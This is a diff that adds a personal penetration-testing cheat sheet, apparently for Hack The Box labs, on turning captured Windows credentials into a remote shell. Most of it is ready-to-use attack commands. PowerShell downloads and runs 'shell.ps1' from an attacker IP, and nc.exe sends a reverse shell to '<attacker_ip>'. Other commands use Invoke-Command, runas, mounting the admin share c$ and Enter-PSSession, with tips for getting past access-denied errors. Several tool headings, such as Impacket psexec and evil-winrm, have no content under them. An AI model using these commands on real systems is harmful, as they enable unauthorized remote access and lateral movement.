@@ -1,0 +1,69 @@
+ When I have credentials, what I will be doing to get a shell:
+
+Spawn processes (launched from the victim’s terminal)
+$pass=ConvertTo-SecureString “<password>” -AsPlainText -Force
+$creds=New-Object System.Management.Automation.PSCredential(“.\<user>”,$pass)
+Start-Process -FilePath “powershell” -ArgumentList “IEX(New-Object Net.WebClient).downloadString(‘http://<my_ip>/shell.ps1’)” 
+-Credential $creds
+
+Invoke  commands (launched from the victim’s terminal)
+$pass=ConvertTo-SecureString “<password>” -AsPlainText -Force
+$creds=New-Object System.Management.Automation.PSCredential(“.\<user>”,$pass)
+
+Hostname
+Invoke-Command –Computer <hostname> -Credential $creds 
+-ScriptBlock { <cmd>}
+
+if you got the error message “Access denied” then add flag -ConfigurationName dc_manage
+
+Invoke-Command –Computer <hostname> -Credential $creds 
+-ConfigurationName dc_manage -ScriptBlock { <cmd>}
+
+runas commands
+C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "<cmd>"
+
+Switch drives (launched from the victim’s terminal)
+Net use y: \\localhost\c$ /user: <username> <password>
+Y:
+
+System Diagnostics
+[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", <username>, <password>, <hostname>)
+
+
+Enter PS-Session (requires open WinRM portl)
+pwsh
+$pass=ConvertTo-SecureString “<password>” -AsPlainText –Force
+$creds=New-Object System.Management.Automation.PSCredential(“htb\<username>”,$pass)
+Enter-PSSession –Computer <hostname_or_victim_ip> -Credential $creds
+
+If you got a message “MI_RESULT_ACCESS_DENIED” then
+Add the following flag –Authentication Negotiate
+Enter-PSSession –Computer <hostname_or_victim_ip> -Credential $creds –Authentication Negotiate
+
+If you got a message “acquiring creds with username only failed” then
+Apt install gss-ntlmssp
+
+And now you should be able to successfully execute the previous command 
+
+
+Evil-winrm (requires open WinRm port)
+
+Ruby evil-winrm.rb (see Appendix for the code)
+
+
+SSH (requires open SSH port  )
+
+Impacket psexec.py (launched from my terminal)
+
+
+Winexe (launched from my terminal)
+
+
+Impacket smbexec.py (launched from my terminal)
+
+
+Impacket Wmiexec.py (launched from my terminal)
+
+Hashed version of the above 
+
+
